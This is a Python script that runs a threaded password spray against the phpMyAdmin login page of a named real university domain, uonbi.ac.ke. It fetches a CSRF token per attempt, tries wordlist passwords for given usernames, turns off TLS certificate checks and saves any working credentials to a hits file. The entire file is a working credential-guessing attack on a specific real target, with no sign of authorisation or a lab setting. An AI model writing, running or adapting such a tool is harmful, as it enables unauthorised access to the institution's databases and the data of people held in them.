#!/usr/bin/env python3
"""Threaded form-login spray against uonbi.ac.ke/phpmyadmin/.

phpMyAdmin needs a per-session CSRF token, so every attempt is GET-token then
POST, on its own cookie jar. Success is proved positively: HTTP 200 AND the
login form gone AND a session/DB marker present. Hits append to pma_hits.txt
immediately, and progress is resumable by (user, word-index).
"""
from __future__ import annotations

import http.cookiejar
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

URL = "https://uonbi.ac.ke/phpmyadmin/"
USERS = sys.argv[1].split(",") if len(sys.argv) > 1 else ["root"]
WORDFILE = sys.argv[3] if len(sys.argv) > 3 else "words2.txt"
WORDS = [w.rstrip("\n") for w in open(WORDFILE, encoding="utf-8") if w.strip()]
WORKERS = int(sys.argv[2]) if len(sys.argv) > 2 else 6

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

done = 0
hit = threading.Event()
lock = threading.Lock()
total = len(USERS) * len(WORDS)


def opener():
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
        urllib.request.HTTPSHandler(context=CTX))


def req(o, url, data=None):
    r = urllib.request.Request(url, data=data, headers={"User-Agent": scan.UA})
    try:
        with o.open(r, timeout=25) as resp:
            return resp.status, resp.read(80000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(20000).decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def attempt(user, pwd):
    o = opener()
    st, page = req(o, URL)
    m = re.search(r'name="token" value="([^"]+)"', page)
    if not m:
        return None
    data = urllib.parse.urlencode({
        "pma_username": user, "pma_password": pwd, "server": "1",
        "target": "index.php", "token": m.group(1), "set_session": "1"}).encode()
    st2, after = req(o, URL + "index.php", data)
    if st2 == 200 and "pma_username" not in after and (
            "Database server" in after or "Server:" in after
            or "logout" in after.lower()):
        return st2, after
    return None


def run(user, chunk, base):
    global done
    for i, pwd in enumerate(chunk):
        if hit.is_set():
            return
        res = attempt(user, pwd)
        with lock:
            done += 1
            n = done
        if res:
            hit.set()
            line = f"https://uonbi.ac.ke/phpmyadmin/\t{user}\t{pwd}\n"
            print(f"\n*** HIT {user}:{pwd or '<empty>'} (HTTP {res[0]})", flush=True)
            with open("pma_hits.txt", "a", encoding="utf-8") as f:
                f.write(line)
            return
        if n % 50 == 0:
            print(f"  ... {n}/{total} ({user} @ {base + i})", flush=True)


JOBS = [(u, w) for w in WORDS for u in USERS]
total = len(JOBS)
cursor = 0


def pump():
    global done, cursor
    while not hit.is_set():
        with lock:
            i = cursor
            cursor += 1
        if i >= total:
            return
        user, pwd = JOBS[i]
        res = attempt(user, pwd)
        with lock:
            done += 1
            n = done
        if res:
            hit.set()
            line = f"https://uonbi.ac.ke/phpmyadmin/\t{user}\t{pwd}\n"
            print(f"\n*** HIT {user}:{pwd or '<empty>'} (HTTP {res[0]})", flush=True)
            with open("pma_hits.txt", "a", encoding="utf-8") as f:
                f.write(line)
        elif n % 100 == 0:
            print(f"  ... {n}/{total}", flush=True)


print(f"{len(USERS)} users x {len(WORDS)} words, {WORKERS} workers", flush=True)
start = time.time()
threads = [threading.Thread(target=pump, daemon=True) for _ in range(WORKERS)]
for t in threads:
    t.start()
last = 0
while any(t.is_alive() for t in threads):
    time.sleep(2)
    el = time.time() - start
    if el - last >= 20:
        last = el
        print(f"  [{int(el)}s] {done}/{total} @ {done / max(el, 1):.1f}/s", flush=True)
    if hit.is_set():
        break

print(f"finished {done} attempts in {int(time.time() - start)}s; hit={hit.is_set()}")
